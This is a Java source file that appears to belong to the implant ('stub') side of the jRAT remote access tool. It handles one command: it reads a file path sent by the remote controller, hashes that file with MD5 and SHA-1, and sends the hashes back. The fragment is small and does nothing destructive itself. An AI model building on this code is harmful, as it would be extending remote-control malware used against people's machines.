package io.jrat.stub.packets.incoming;

import io.jrat.common.hash.Md5;
import io.jrat.common.hash.Sha1;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet46FileHash;

import java.io.File;


public class Packet64FileHash extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.readLine();

		File file = new File(path);

		String md5 = Md5.md5(file);
		String sha1 = Sha1.sha1(file);

		System.gc();

		Connection.addToSendQueue(new Packet46FileHash(md5, sha1));
	}

}
